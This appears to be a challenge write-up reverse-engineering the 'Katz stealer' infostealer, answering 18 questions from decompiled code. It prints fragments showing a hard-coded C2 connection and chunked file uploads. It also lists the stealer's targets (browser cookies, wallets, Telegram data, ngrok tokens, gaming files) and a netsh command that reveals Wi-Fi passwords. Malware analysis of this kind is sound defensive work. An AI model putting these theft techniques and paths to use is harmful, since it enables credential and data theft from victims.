# Katz stealer

---

![Screenshot 2026-06-05 at 1.15.43 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_1.15.43_PM.png)

Challenge: [https://malops.io/challenges/katz-stealer](https://malops.io/challenges/katz-stealer)

---

### Scenario

The internal security team received a tip that a user account may have been compromised. A suspicious executable was discovered on the computer of an employee in the Marketing department. The file was named report_update.exe and was located in the Downloads folder. Can you help us answer the following questions to support our investigation?

---

### Question 1

What is the size in bytes of the memory block containing the sequence of pointers to country code strings?

If we search for “RU” country code will lead to this .data section

![Screenshot 2026-06-05 at 2.28.51 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_2.28.51_PM.png)

Do the math:

Now you simply multiply the number of items by the size of each item: **`9 pointers × 8 bytes per pointer = 72 bytes`**

You may also search **`GetLocaleInfoA` you will get this**

```bash
140006fef        uint32_t idThread =
140006fef            __builtin_memcpy(dest: &var_1088, src: &data_140010da0, count: 0x48)
140006ff1        int64_t rsi = 0
140006ff3        uint32_t dwProcessId = 0x2b0028
140007006        int16_t var_139c = 0x2c
140007010        wchar16 var_17b8 = 0
14000701a        char var_17b6 = 0
140007022        wchar16 var_15b0 = 0
14000702c        char var_15ae = 0
140007051        GetLocaleInfoA(Locale: GetKeyboardLayout(idThread), LCType: 0x5a, 
140007051            lpLCData: &var_15b0, cchData: 3)
140007066        GetLocaleInfoA(Locale: 0x400, LCType: 0x5a, lpLCData: &var_17b8, cchData: 3)
140007068        uint16_t rax_1 = GetSystemDefaultLangID()
140007078        char* var_2c58 = &var_1088
140007085        int32_t var_2c4c_1
```

check **`idThread`** (**`&data_140010da0`**) will lead to the CIS Country.

```bash
140010da0  void* data_140010da0 = data_140015522 {"RU"}
140010da8  void* data_140010da8 = data_140015525 {"BY"}
140010db0  void* data_140010db0 = data_140015528 {"KZ"}
140010db8  void* data_140010db8 = data_14001552b {"KG"}
140010dc0  void* data_140010dc0 = data_14001552e {"TJ"}
140010dc8  void* data_140010dc8 = data_140015531 {"UZ"}
140010dd0  void* data_140010dd0 = data_140015534 {"AM"}
140010dd8  void* data_140010dd8 = data_140015537 {"AZ"}
140010de0  void* data_140010de0 = data_14001553a {"MD"}
```

![Screenshot 2026-06-05 at 2.40.47 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_2.40.47_PM.png)

ANSWER:

```bash
72
```

---

### Question 2

What is the name of the enumeration type for the first parameter of GetLocaleInfoA?

```bash
140007066        GetLocaleInfoA(Locale: 0x400, LCType: 0x5a, lpLCData: &var_17b8, cchData: 3)
140007068        uint16_t rax_1 = GetSystemDefaultLangID()
```

![Screenshot 2026-06-05 at 2.47.26 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_2.47.26_PM.png)

Checking the first argument parameter of GetLocaleInfoA is **`0x400` .**

looking up the msdn we got this.

![Screenshot 2026-06-05 at 2.48.08 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_2.48.08_PM.png)

ANSWER

```bash
LOCALE_USER_DEFAULT
```

---

### Question 3

What protocol is used by the malware to communicate with the C2 server?

There’s a socket function we can take a look.

```bash
14000710e                        while (true)
14000710e                            s = socket(af: 2, type: SOCK_STREAM, protocol: 0)
14000710e                            
```

![Screenshot 2026-06-05 at 2.54.00 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_2.54.00_PM.png)

The sample uses SOC_STREAM which is TCP

ANSWER

```bash
tcp
```

---

### Question 4

What is the port number used by the malware to connect to the C2 server in decimal?

Just a little bit down where we found the answer of the previous question you will get this.

```bash
14000711a                            
140007140                            SOCKADDR name
140007140                            name.sa_family = 2
14000714d                            uint32_t rax_8 = inet_addr(cp: "185.107.74.40")
140007154                            name.sa_data[2] = rax_8.b
140007154                            name.sa_data[3] = rax_8:1.b
140007154                            name.sa_data[4] = rax_8:2.b
140007154                            name.sa_data[5] = rax_8:3.b
14000715b                            uint16_t rax_9 = htons(hostshort: 0xc3b)
140007174                            name.sa_data[0] = rax_9.b
140007174                            name.sa_data[1] = rax_9:1.b
```

There’s a ip address **`185.107.74.40` and `htons(hostshort: 0xc3b)` which is `3131` .**

![Screenshot 2026-06-05 at 3.00.14 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_3.00.14_PM.png)

ANSWER

```bash
3131
```

---

### Question 5

What is the maximum chunk size the malware uses to download the injected DLL in hex?

Just scroll a bit down where we found our previous answer you will get a recv function download loop

```bash
14000724b                        if (recv(s, buf: &var_2c0c, len: 4, flags: 0) == 4)
140007258                            uint32_t rax_13 = ntohl(netlong: var_2c0c)
14000725e                            var_2c0c = rax_13
14000725e                            
14000726c                            if (rax_13 - 1 u<= 0x5f5e0fe)
14000727c                                int32_t rbx_1 = 0
14000727e                                FILE* _Stream = fopen(_FileName: &var_2ba4, _Mode: "wb")
14000727e                                
140007289                                if (_Stream != 0)
14000728f                                    while (true)
14000728f                                        uint32_t r8_3 = var_2c0c
14000728f                                        
14000729a                                        if (rbx_1 u>= r8_3)
14000729a                                            break
14000729a                                        
1400072a1                                        int32_t len = r8_3 - rbx_1
1400072a1                                        
1400072b4                                        if (len u> 0x1000)
1400072b4                                            len = 0x1000
1400072b4                                        
1400072b8                                        int32_t rax_15 =

```

check the len which is **`0x1000` .**

ANSWER

```bash
0x1000
```

---

### Question 6

What is the address of the function responsible for launching browsers for injection in hex ?

Continue scroll down you will see a comparison of browsers with **`rax_27` .**

```bash
1400074cd                                            int32_t rsi_1 = 1
1400074cd                                            
1400074e3                                            while (true)
1400074e3                                                wchar16 const* const _String2 =
1400074e3                                                    &(*u"\msedge.exe")[1]
1400074e3                                                
1400074f1                                                if (strcmp(_Str1: rax_27, _Str2: "edge")
1400074f1                                                        != 0)
1400074ff                                                    _String2 = u"chrome.exe"
1400074ff                                                    
14000750d                                                    if (
14000750d                                                            strcmp(_Str1: rax_27, _Str2: "brave")
14000750d                                                            == 0)
14000750f                                                        _String2 = u"brave.exe"

```

and **`rax_27`** is passed as a argument for the function sub_140002aeb

```bash
if (sub_140002aeb(rax_27) != 0)
```

![Screenshot 2026-06-05 at 3.16.43 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_3.16.43_PM.png)

If we check that function it starts from **`140002aeb` .**

![Screenshot 2026-06-05 at 3.17.05 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_3.17.05_PM.png)

ANSWER

```bash
0x140002aeb
```

---

### Question 7

What is the address of the start of the loop that checks if a process matches the target browser executable name in hex?

1. Press **`g`** on your keyboard (this opens the "Go to Address" dialog).
2. Type `Process32NextW` and press Enter.
3. It will jump you directly to the `Process32NextW` import entry.
4. Now press **`x`** to see all the cross-references (places that call this function).
5. You'll see two references. Look for the one at address `0x140007577` — double-click it.
6. You're now inside the loop! The loop starts at `0x14000755f`.

![Screenshot 2026-06-05 at 4.02.20 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_4.02.20_PM.png)

ANSWER

```bash
0x14000755f
```

---

### Question 8

What is the maximum chunk size the malware uses when sending the file contents to the C2 server in hex?

1. Open the **Symbols** or **Imports** view.
2. Search for the imported function **`send`**.
3. Press **`x`** on it to find its Cross-References. You'll see a few places where `send` is used.
4. Double-click the cross-reference that takes you inside a function that looks like it's reading a file (you will see it calling `fopen` with `"rb"`, `fseek`, and `fread`). *(In my analysis, this was `sub_1400019c5`)*.
5. Switch to the **High-Level IL** (pseudocode) view.
6. Look at the `while` loop near the bottom of that function. You will see a call to `fread()` that reads data into a buffer, immediately followed by a call to `send()`.

```bash
size_read = fread(&buffer, 1, 0x1000, file_stream);
// ...
send(socket, &buffer, size_read, 0);
```

1. The third argument to `fread()` dictates the maximum number of bytes it will read into the buffer per loop iteration. That value is the maximum chunk size sent to the C2!

The answer in hex is **`0x1000`**!

![Screenshot 2026-06-05 at 4.14.31 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_4.14.31_PM.png)

ANSWER

```bash
0x1000
```

---

### Question 9

What is the wildcard used to find Discord version folders?

To find the wildcard used for Discord version folders, we need to look at how the malware searches the file system for Discord installations. Malware often does this using Windows APIs like `FindFirstFileW`.

If you look at the decompiled code around the Discord stealing functionality (which we saw earlier near address `0x1400078a9`), you will see something like this:

```
wcscpy(&path_buffer, discord_base_path);
sub_140005225(&path_buffer, u"**app-***");
HANDLE hFindFile = FindFirstFileW(&path_buffer, ...);
```

Discord installs its actual binaries and data into versioned subfolders (for example, `app-1.0.9004`). To find the latest version dynamically, the malware uses the wildcard string **`app-*`**.

![Screenshot 2026-06-05 at 4.18.09 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_4.18.09_PM.png)

ANSWER

```bash
app-*
```

---

### Question 10

What is the maximum number of retries for uploading the cookies copy to the C2?

1. Open the **Strings** view.
2. Search for the string **`Cookies_copy.db`** (or just **`Cookies_copy`**). You will find the string `"%s\%s_%s_Cookies_copy.db"`.
3. Double-click the string to go to its location in memory, then press **`x`** to find Cross-References. You'll be taken inside a large function (in my analysis, this is `sub_140006665`) which handles Chromium-based browser file stealing.
4. Switch to the **High-Level IL** (pseudocode) view.
5. In this function, you will see a loop that copies the `Cookies` database to a temporary location using `CopyFileA`, and then calls the file-sending wrapper function (which we analyzed in Question 8) to upload it.

![Screenshot 2026-06-05 at 4.33.11 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_4.33.11_PM.png)

ANSWER

```bash
3
```

---

### Question 11

How many important files per profile does the function attempt to find and send?

1. Go to the **Strings** view and search for **`profiles.ini`** or **`firefox\%s\%s`**.
2. Press **`x`** on the string's address to find its cross-reference, which will take you to **`sub_140001f22`**.
3. Look at the High-Level IL for this function. You will see it opens `profiles.ini` to parse the paths of installed Firefox profiles.
4. After resolving a profile path, you will see a loop that looks something like this:

```bash
int64_t file_array[6];
memcpy(&file_array, 0x140010080, 48); // Copies array of 6 pointers
int j = 0;
while (j != 6) {
    char* target_file = file_array[j];
    // Constructs path and uploads the file
    ...
    j++;
}
```

![Screenshot 2026-06-05 at 5.25.48 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_5.25.48_PM.png)

ANSWER

```bash
6
```

---

### Question 12

How many characters long is the random ID generated for the temporary wallet dump directory?

To find where the malware handles cryptocurrency wallet theft, we can search the strings for wallet-related keywords like `wallet.dat`, `exodus.wallet`, or `wallet_dump_%s`. Tracing the cross-references for the `wallet_dump_%s` format string brings us to the main wallet stealing routine (located at `sub_140005c06`).

![Screenshot 2026-06-05 at 5.54.39 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_5.54.39_PM.png)

At the beginning of this function, the malware sets up a temporary staging directory to store the stolen wallet files before exfiltrating them to the C2 server. To ensure the directory name is unique, it appends a randomly generated string to the prefix `wallet_dump_`.

Looking at the High-Level IL in Binary Ninja, we can observe the random generation algorithm:

```bash
// 1. Define the 62-character alphabet
char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; 

// 2. Seed the RNG using the Process ID and current time
srand(GetCurrentProcessId() + _time64(...)); 

// 3. Generate the random string
int i = 0;
char random_id[12]; 
do {
    // Pick a random character (rand() % 62)
    random_id[i] = charset[rand() % 0x3e];
    i++;
} while (i != 0xc); // Loop terminates when i == 12

// 4. Null-terminate and format the directory path
char null_terminator = 0; 
char dir_path[0x104];
sprintf(dir_path, "%s\\wallet_dump_%s", temp_path, random_id);
CreateDirectoryA(dir_path, nullptr);
```

![Screenshot 2026-06-05 at 5.56.12 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_5.56.12_PM.png)

The loop responsible for building this random ID increments the counter `i` and breaks when `i != 0xc`. Since `0xc` is hexadecimal for **12**, the malware explicitly generates a 12-character long random alphanumeric string for the directory name.

ANSWER

```bash
12
```

---

### Question 13

What is the address of the function that used to search about the telegram data?

1. First, search the Strings view for **`Telegram Desktop\tdata`** or **`Telegram-tdata`**.

![Screenshot 2026-06-05 at 6.04.38 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_6.04.38_PM.png)

1. Find the cross-references for these strings, which lead you inside the main data-stealing routine (`sub_140006f86`).
2. Inside `sub_140006f86`, you will see the malware format the full path to the Telegram `tdata` directory:
    
    ```
    sprintf(&telegram_path, "%s\\Telegram Desktop\\tdata", appdata_dir);
    ```
    
3. Immediately following this, the malware passes this path into a new function to process it:

```bash
sub_140001ab2(socket, &telegram_path, "Telegram-tdata");

```

5. If you double-click and decompile `sub_140001ab2`, you will see that it is a specialized recursive directory walker. It loops through the `tdata` directory using `FindFirstFileA`/`FindNextFileA` and filters files by matching them against an array of strings (such as checking if files end in `s` or map to Telegram's internal data formats) before uploading them using the `send` wrapper (`sub_1400019c5`).

![Screenshot 2026-06-05 at 6.07.02 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_6.07.02_PM.png)

Therefore, the function explicitly responsible for searching and processing Telegram data is located at `0x140001ab2`.

ANSWER

```bash
0x140001ab2
```

---

### Question 14

When the malware writes the CPU core count to the file, which function does it call immediately before writing?

1. Search the **Strings** view for `"CPU Core Count: %u\n"` or `"System-Information.txt"`.
2. Following the cross-references will take you to a block in the main data collection function (around `0x140008b9a`).
3. You will see the malware open `System-Information.txt` with `fopen`.
4. Right before it formats and writes the CPU core count using `fprintf` (or its internal wrapper `sub_14000f720`), it calls the Windows API function **`GetSystemInfo`** to populate a `SYSTEM_INFO` structure.
5. It then extracts `dwNumberOfProcessors` from this structure to write to the file.

![Screenshot 2026-06-05 at 6.11.55 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_6.11.55_PM.png)

ANSWER

```bash
GetSystemInfo
```

---

### Question 15

Which configuration filename does the malware specifically look for to extract the ngrok authtoken?

If you look towards the very end of the main data collection routine (`sub_140006f86`), right after it finishes collecting system information, it attempts to steal the ngrok token.

It does this by getting the `%USERNAME%` environment variable and explicitly formatting the path to open the ngrok configuration file:

```bash
sprintf(&ngrok_path, "C:\\Users\\%s\\AppData\\Local\\ngrok\\ngrok.yml", username);
FILE* ngrok_file = fopen(&ngrok_path, "r");
```

![Screenshot 2026-06-05 at 6.16.05 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_6.16.05_PM.png)

It then reads this file line-by-line using `fgets` and uses `strstr` to search for the string `"authtoken:"`. If it finds it, it writes the configuration to a temporary file and uploads it to the C2 as `Credentials/Ngrok.txt`.

ANSWER

```bash
ngrok.yml
```

---

### Question 16

What command does the malware run to list all saved WiFi profiles on the system?

If you search the binary's strings for typical Wi-Fi related keywords (or look around the area where it generates `WiFi_Information.txt`), you will see the exact command line strings it executes via `_popen` (or similar mechanisms to capture command output).

The malware uses two commands in sequence to steal Wi-Fi credentials:

1. **`netsh wlan show profiles`**  This lists all the SSIDs of the wireless networks the computer has previously connected to.
2. **`netsh wlan show profile name="%s" key=clear`**  The malware parses the output of the first command, extracts the profile names, and then iterates through them using this second command to reveal the plaintext Wi-Fi passwords.

![Screenshot 2026-06-05 at 6.20.49 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_6.20.49_PM.png)

ANSWER

```bash
netsh wlan show profiles
```

---

### Question 17

Which the full registry key is opened to locate the Foxmail executable path?

1. Search the **Strings** view for `"Foxmail"`. You will see the string `"SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command"`.
2. Follow the cross-references for this string, which brings you to `sub_140003c0d` (the Foxmail stealer routine).
3. Look at the call to `RegOpenKeyExA`.
4. The first argument passed to this API function is the root key handle. In the assembly, `rcx` is set to `2147483646` (`0x80000002`), which is the constant for **`HKEY_LOCAL_MACHINE`**.
5. Combining the root key with the string parameter gives you the full registry path.

![Screenshot 2026-06-05 at 6.24.44 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_6.24.44_PM.png)

ANSWER

```bash
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command
```

---

### Question 18

What is the address of the function used to extract gaming account data in hex?

To find the function responsible for extracting gaming account data, we can trace the execution flow organically from the main data-stealing routine (`sub_140006f86`).

If we scroll to the bottom of the main routine in Binary Ninja's High-Level IL view, we can observe a cluster of function calls executed just before the malware finishes its core collection phase and cleans up:

```bash
...
sub_140002f1d(socket)
sub_140003a93(socket)
sub_1400035cb(socket)
sub_140003213(socket)
sub_1400033f8(socket)
sub_140003fc0(socket)  // <-- Gaming Data Stealer
```

By double-clicking and decompiling these functions one by one, we arrive at **`sub_140003fc0`**. Inside this function, we can see it is a dedicated module for stealing gaming launcher configurations and authorization files.

It works by iterating over a massive, hardcoded array (located at `0x140010100`) containing file paths for various gaming platforms. The strings referenced in this array include:

- Minecraft (`%A%\.minecraft\launcher_accounts.json`)
- Steam (`ssfn*` authorization files)
- Custom Launchers (Lunar, Feather, Impact, Novoline, CheatBreaker)

When the malware finds a match on the victim's filesystem, it extracts the file, formats the destination path using `"Games/%s/%s/%s"`, and transmits it to the C2 server under a dedicated `Games` directory. Therefore, the function used to extract gaming account data is located at address **`0x140003fc0`**.

![Screenshot 2026-06-05 at 6.39.02 PM.png](Katz%20stealer/Screenshot_2026-06-05_at_6.39.02_PM.png)

ANSWER

```bash
0x140003fc0
```

---